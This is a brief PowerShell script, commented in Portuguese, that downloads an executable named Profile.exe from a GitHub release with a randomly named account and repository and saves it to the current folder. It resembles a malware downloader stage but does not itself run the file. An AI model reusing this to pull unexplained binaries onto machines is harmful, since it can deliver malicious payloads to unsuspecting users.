# URL do arquivo para download
$url = "https://github.com/ggt22t11125ras/gaw66sdhsdhxchqw3rf/releases/download/1/Profile.exe"

# Nome do arquivo de destino
$fileName = "Profile.exe"

# Caminho completo para o arquivo de destino
$filePath = Join-Path -Path (Get-Location) -ChildPath $fileName

# Criando um objeto WebClient
$webClient = New-Object System.Net.WebClient

# Baixando o arquivo e salvando-o no diretório atual
$webClient.DownloadFile($url, $filePath)

Write-Host "Arquivo baixado em: $filePath"
